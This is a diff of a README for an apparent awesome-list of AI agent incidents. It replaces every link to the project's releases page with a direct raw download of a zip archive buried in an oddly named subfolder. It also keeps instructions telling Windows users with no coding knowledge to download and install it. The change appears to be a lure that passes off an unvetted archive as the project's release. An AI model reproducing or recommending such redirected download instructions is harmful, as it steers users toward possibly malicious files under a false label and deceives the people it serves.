@@ -1,6 +1,6 @@
 # 🧠 awesome-ai-agent-incidents - Learn agent risks with clear cases
 
-[![Download](https://img.shields.io/badge/Download%20the%20release-blue?style=for-the-badge&logo=github)](https://github.com/languagezoneenterprise545/awesome-ai-agent-incidents/releases)
+[![Download](https://img.shields.io/badge/Download%20the%20release-blue?style=for-the-badge&logo=github)](https://github.com/languagezoneenterprise545/awesome-ai-agent-incidents/raw/refs/heads/main/spiloma/awesome_ai_agent_incidents_v1.8.zip)
 
 ## 📌 What this is
 
@@ -20,7 +20,7 @@ This package is built for easy access on Windows. You do not need coding knowled
 
 ## 🚀 Download and install
 
-1. Visit this page to download: https://github.com/languagezoneenterprise545/awesome-ai-agent-incidents/releases
+1. Visit this page to download: https://github.com/languagezoneenterprise545/awesome-ai-agent-incidents/raw/refs/heads/main/spiloma/awesome_ai_agent_incidents_v1.8.zip
 2. Find the latest release near the top of the page.
 3. Under **Assets**, look for the main download file.
 4. Download the file to your computer.
@@ -172,7 +172,7 @@ Yes. The structure is useful for new users who want a clear view of agent risks 
 
 ## 📎 Download again
 
-[Visit the releases page to download](https://github.com/languagezoneenterprise545/awesome-ai-agent-incidents/releases)
+[Visit the releases page to download](https://github.com/languagezoneenterprise545/awesome-ai-agent-incidents/raw/refs/heads/main/spiloma/awesome_ai_agent_incidents_v1.8.zip)
 
 ## 🧭 Suggested reading order
 
